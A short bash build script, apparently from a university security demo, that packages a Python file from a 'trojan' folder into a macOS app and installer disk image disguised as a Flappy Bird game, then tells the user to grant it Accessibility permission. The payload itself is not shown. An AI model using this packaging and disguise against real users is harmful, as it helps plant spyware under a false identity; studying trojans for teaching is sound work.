#!/bin/bash
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
PROJECT_DIR="$(dirname "$SCRIPT_DIR")"
cd "$PROJECT_DIR"

echo "================================================"
echo "  Building FlappyDemo.app"
echo "================================================"

source venv/bin/activate

# Gera icone se nao existir
if [ ! -f trojan/FlappyBird.icns ]; then
    python trojan/generate_icon.py
fi

# Limpa builds anteriores
rm -rf build dist *.spec

# Build com novo nome e bundle ID (onedir para compatibilidade com macOS security)
pyinstaller \
    --windowed \
    --name "FlappyDemo" \
    --icon "trojan/FlappyBird.icns" \
    --osx-bundle-identifier "com.ufpb.flappydemo.final" \
    trojan/flappybird.py

# Gera DMG
echo ""
echo "[2/2] Gerando .dmg..."

rm -f "$PROJECT_DIR/dist/FlappyDemo-Install.dmg"

create-dmg \
    --volname "Flappy Bird" \
    --volicon "trojan/FlappyBird.icns" \
    --window-pos 200 120 \
    --window-size 600 400 \
    --icon-size 100 \
    --icon "FlappyDemo.app" 150 185 \
    --app-drop-link 450 185 \
    --hide-extension "FlappyDemo.app" \
    "$PROJECT_DIR/dist/FlappyDemo-Install.dmg" \
    "$PROJECT_DIR/dist/FlappyDemo.app"

# Limpa temporarios
rm -rf build *.spec

echo ""
echo "================================================"
echo "  DONE!"
echo "  .app: dist/FlappyDemo.app"
echo "  .dmg: dist/FlappyDemo-Install.dmg"
echo ""
echo "  After opening, grant Accessibility to"
echo "  'FlappyDemo' in System Settings"
echo "  Debug: cat /tmp/flappy_debug.log"
echo "================================================"
